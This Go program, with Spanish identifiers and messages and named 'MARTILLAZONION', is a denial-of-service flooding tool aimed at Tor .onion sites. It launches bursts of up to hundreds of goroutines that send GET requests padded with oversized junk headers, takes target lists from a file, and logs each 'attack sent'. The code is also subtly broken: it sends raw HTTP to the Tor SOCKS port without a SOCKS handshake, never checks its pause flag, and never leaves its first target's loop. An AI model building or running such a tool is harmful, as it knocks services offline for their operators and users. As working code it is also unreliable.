package main

import (
	"bufio"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
	"time"
)

var (
	onionHost   string
	torPort     int
	maxHilos    int
	rafagaHilos int
	objetivos   []string
	pausado     bool
)

const (
	PORT               = 80
	PAQUETES_POR_CONN  = 80
	TTL_VALUE          = 1
	SOCKET_TIMEOUT     = 4 * time.Second
	DELAY_ENTRE_PAKETS = 2 * time.Millisecond
	DELAY_RAFAGA       = 10 * time.Second
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
	"Mozilla/5.0 (X11; Linux x86_64)",
	"curl/7.87.0", "Wget/1.21.1", "Lynx/2.8.9rel.1",
}
var referers = []string{
	"http://duckduckgo.com", "http://protonmail.com", "http://torproject.org", "http://facebookcorewwwi.onion",
}

var (
	lock         sync.Mutex
	hilosActivos int
	ataquesEnviados int
	erroresConn     int
	logFile         *os.File
	reintentosMax   = 3
)

func generarPayload() string {
	headersExtra := ""
	for i := 0; i < rand.Intn(4)+2; i++ {
		headersExtra += fmt.Sprintf("X-Atk-%d: %s\r\n", i, strings.Repeat("Z", rand.Intn(501)+300))
	}
	return fmt.Sprintf(
		"GET /fire?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nReferer: %s\r\n%sConnection: close\r\n\r\n",
		rand.Intn(900000)+100000,
		onionHost,
		userAgents[rand.Intn(len(userAgents))],
		referers[rand.Intn(len(referers))],
		headersExtra,
	)
}

func proxyDisponible() bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", torPort), 2*time.Second)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func logAtaque(msg string) {
	if logFile != nil {
		logFile.WriteString(fmt.Sprintf("%s [%s]\n", time.Now().Format(time.RFC3339), msg))
	}
}

func ataque() {
	defer func() {
		lock.Lock()
		hilosActivos--
		lock.Unlock()
	}()
	for i := 0; i < PAQUETES_POR_CONN; i++ {
		var err error
		for intento := 0; intento < reintentosMax; intento++ {
			conn, errDial := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", torPort), SOCKET_TIMEOUT)
			if errDial != nil {
				lock.Lock()
				erroresConn++
				lock.Unlock()
				logAtaque(fmt.Sprintf("Error conexión (intento %d): %v", intento+1, errDial))
				time.Sleep(1 * time.Second)
				err = errDial
				continue
			}
			conn.SetDeadline(time.Now().Add(SOCKET_TIMEOUT))
			payload := generarPayload()
			_, errWrite := conn.Write([]byte(payload))
			conn.Close()
			if errWrite != nil {
				lock.Lock()
				erroresConn++
				lock.Unlock()
				logAtaque(fmt.Sprintf("Error envío: %v", errWrite))
				err = errWrite
				continue
			}
			lock.Lock()
			ataquesEnviados++
			lock.Unlock()
			logAtaque(fmt.Sprintf("Ataque enviado [%s]", time.Now().Format("15:04:05")))
			fmt.Printf("[%s] Ataque #%d enviado\n", time.Now().Format("15:04:05"), ataquesEnviados)
			break
		}
		if err != nil {
			fmt.Printf("[!] Error persistente al enviar ataque: %v\n", err)
		}
		time.Sleep(DELAY_ENTRE_PAKETS)
	}
}

func lanzarRafaga(cantidad int) {
	lock.Lock()
	disponibles := maxHilos - hilosActivos
	if disponibles <= 0 {
		lock.Unlock()
		return
	}
	lanzar := cantidad
	if disponibles < cantidad {
		lanzar = disponibles
	}
	hilosActivos += lanzar
	lock.Unlock()

	for i := 0; i < lanzar; i++ {
		go ataque()
	}
}

func mainLoop() {
	for {
		if proxyDisponible() {
			lanzarRafaga(rafagaHilos)
			lock.Lock()
			fmt.Printf("[⚒️] Ráfaga lanzada: %d hilos activos: %d\n", rafagaHilos, hilosActivos)
			lock.Unlock()
		} else {
			fmt.Printf("[✗] Tor no responde en 127.0.0.1:%d. Esperando...\n", torPort)
		}
		time.Sleep(DELAY_RAFAGA)
	}
}

func cargarObjetivosDesdeArchivo(path string) []string {
	var lista []string
	f, err := os.Open(path)
	if err != nil {
		fmt.Println("No se pudo abrir el archivo de objetivos:", err)
		return lista
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lista = append(lista, line)
		}
	}
	return lista
}

func mostrarAyudaExtendida() {
	fmt.Println("Uso extendido:")
	fmt.Println("  -host <dominio.onion> [-p 9050] [-t 500] [-r 100]")
	fmt.Println("  -targets <archivo.txt>  (para múltiples objetivos)")
	fmt.Println("  -log <archivo>          (para registrar ataques)")
	fmt.Println("  -help                   (muestra esta ayuda)")
}

func main() {
	flag.StringVar(&onionHost, "host", "", "Dominio .onion (v3) objetivo")
	flag.IntVar(&torPort, "p", 9050, "Puerto SOCKS5 de Tor (default: 9050)")
	flag.IntVar(&maxHilos, "t", 500, "Cantidad inicial de hilos (default: 500)")
	flag.IntVar(&rafagaHilos, "r", 100, "Hilos por ráfaga (default: 100)")
	var logPath string
	var targetsFile string
	var showHelp bool
	flag.StringVar(&logPath, "log", "", "Archivo para registrar ataques (opcional)")
	flag.StringVar(&targetsFile, "targets", "", "Archivo con lista de objetivos .onion")
	flag.BoolVar(&showHelp, "help", false, "Mostrar ayuda extendida")
	flag.Parse()
	if showHelp {
		mostrarAyudaExtendida()
		os.Exit(0)
	}
	if targetsFile != "" {
		objetivos = cargarObjetivosDesdeArchivo(targetsFile)
	} else if onionHost != "" {
		objetivos = []string{onionHost}
	}
	if len(objetivos) == 0 {
		fmt.Println("Debes especificar al menos un objetivo con -host o -targets")
		os.Exit(1)
	}

	if logPath != "" {
		var err error
		logFile, err = os.Create(logPath)
		if err != nil {
			fmt.Println("No se pudo crear el archivo de log:", err)
		}
		defer logFile.Close()
	}

	fmt.Printf("\n[🔥] MARTILLAZONION - Versión Sencilla\n")
	fmt.Printf("[→] Objetivo: %s\n", onionHost)
	fmt.Printf("[→] Usando Tor SOCKS5 en puerto %d\n", torPort)
	fmt.Printf("[→] Hilos máximos: %d, ráfaga: %d\n\n", maxHilos, rafagaHilos)

	// Captura Ctrl+C para mostrar resumen
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)
	go func() {
		<-c
		fmt.Printf("\n\n[Resumen] Ataques enviados: %d | Errores de conexión: %d\n", ataquesEnviados, erroresConn)
		if logFile != nil {
			fmt.Println("[+] Log guardado en:", logPath)
		}
		os.Exit(0)
	}()
	go func() {
		reader := bufio.NewReader(os.Stdin)
		for {
			fmt.Print("[PAUSA/ESTAD] Escribe 'p' para pausar/reanudar, 's' para estadísticas: ")
			txt, _ := reader.ReadString('\n')
			txt = strings.TrimSpace(txt)
			if txt == "p" {
				pausado = !pausado
				if pausado {
					fmt.Println("Ataque pausado.")
				} else {
					fmt.Println("Ataque reanudado.")
				}
			}
			if txt == "s" {
				lock.Lock()
				fmt.Printf("[ESTAD] Ataques enviados: %d | Errores: %d | Hilos activos: %d\n", ataquesEnviados, erroresConn, hilosActivos)
				lock.Unlock()
			}
		}
	}()
	for _, objetivo := range objetivos {
		onionHost = objetivo
		fmt.Printf("\n[🔥] Atacando objetivo: %s\n", onionHost)
		mainLoop()
		fmt.Printf("[Resumen objetivo %s] Ataques: %d | Errores: %d\n", onionHost, ataquesEnviados, erroresConn)
		ataquesEnviados, erroresConn = 0, 0
	}
}
